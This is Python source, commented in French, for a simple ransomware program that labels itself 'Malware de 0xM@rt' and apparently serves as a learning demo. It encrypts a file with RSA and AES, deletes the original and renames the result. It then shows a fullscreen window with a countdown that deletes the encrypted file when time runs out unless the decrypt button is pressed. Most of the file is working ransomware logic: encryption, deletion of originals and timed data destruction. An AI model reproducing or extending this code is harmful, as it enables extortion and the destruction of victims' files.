#Fichier pour pouvoir déchiffrer les données


# Importation des librairie utile pour le projet
import os
import base64
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import  PKCS1_OAEP,  AES
import tkinter as tk

# Définition de nos variables
key = RSA.generate(2048)
path = '.'

# Afficher ses clés:
privateKey = key.export_key('PEM')
publicKey = key.publickey().export_key('PEM')


# Sauvegarde des clés dans des fichiers:
file = open('private.pem','wb')
file.write(privateKey)
file.close
file = open('public.pem','wb')
file.write(publicKey)
file.close	

# Fonction qui permet de lister les fichiers d'un répertoire ici le répertoire courant
def listeRépertoire ():
	files = os.listdir(path)
	for name in files:
    		print(name)    
# Fonction qui permet de chiffrer un fichier 
def encrypt(dataFile, publicKey,suffix):
    """
    use EAX mode to allow detection of unauthorized modifications
    """
    
    # Permet  de lire le fichier a chiffrer
    with open(dataFile,  'rb')  as f:
        data = f.read()
        data = bytes(data)
        key = RSA.import_key(publicKey)
    # Permet  de générer une clé symétrique de chiffrement
    sessionKey  = os.urandom(16)
    cipher = PKCS1_OAEP.new(key)
    # Chiffrement  dela clé symétriquede chiffrement  avec la clé publique
    encryptedSessionKey  = cipher.encrypt(sessionKey)
    cipher = AES.new(sessionKey,  AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    # Cette partie  permet  d’enregistrer  votre fichier sous le nom  de nomFichier_encrypt.ext
    [ fileName, fileExtension ] = dataFile.split('.')
    encryptedFile  = fileName + '_encrypted.'  + fileExtension
    with open(encryptedFile,  'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey,  cipher.nonce,  tag, ciphertext)  ]
    print('le fichier crypter est' + encryptedFile)
    # Cette partie supprime le fichier original
    os.remove('file.txt')
    os.remove('file_encrypted.blc')
    # Cette partie permet de modifier l'extension
    ext = os.path.splitext(encryptedFile)[0]
    os.rename(encryptedFile, ext+ suffix)

# Decryption des fichiers #
def decrypt(dataFile, privateKeyFile):
    """
    use EAX mode to allow detection  of unauthorized  modifications
    """
    # Permet  de lire la cléprivée
    with open(privateKeyFile,  'rb') as f:
        privateKey  = f.read()
        # Création d'une private Key
        key = RSA.import_key(privateKey)
    with open(dataFile,  'rb')  as f:
        # lecture de la clé de session
        encryptedSessionKey,  nonce, tag, ciphertext  = [ f.read(x) for x in (key.size_in_bytes(),  16, 16, -1) ]
        cipher  = PKCS1_OAEP.new(key)
        # Permet  de déchiffrer la clé de chiffrement
        sessionKey  = cipher.decrypt(encryptedSessionKey)
        cipher = AES.new(sessionKey,  AES.MODE_EAX,  nonce)
        #Pour dechiffrer  les données
        data = cipher.decrypt_and_verify(ciphertext,  tag)
        [ fileName, fileExtension ] = dataFile.split('.')
        decryptedFile  = 'file_decrypter.txt'
        with open(decryptedFile,  'wb') as f:
            f.write(data)
        print('le fichier decrypter est ' + decryptedFile)
 

# Fonction pour afficher une interface graphique
def countdown(count):
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
    
    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second >= 0 or minute > 0 or hour > 0:
    # condition pour faire fonctionner le timer
        if second > 0:
            second -= 1
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif minute > 0:
            minute -= 1
            second = 59
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
            root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))
        # si le timer arrive a 0 les fichiers seront supprimmé et la fenêtre ce ferme
        elif second == 0 and minute == 0 and hour == 0:
            os.remove(filedecrypt)
            root.destroy()
           
        
    
filedecrypt = "file_encrypted.blc"
suffix = '.blc'
fileName = "file.txt"
# Ici définition des propriétés de la fenetre graphique
root = tk.Tk()
root.title('Malware de 0xM@rt')
root.attributes('-fullscreen', True)
root.resizable(False, False)
button = tk.Button(root,text = 'Déchiffrer',command=lambda :[decrypt(filedecrypt, "private.pem"),root.quit()])
button.pack()
label = tk.Label(root,font=('time', 50,'bold'), fg='red', bg='black')
label.pack()



# Appel des fonctions
encrypt(fileName, publicKey,suffix)

root.mainloop()

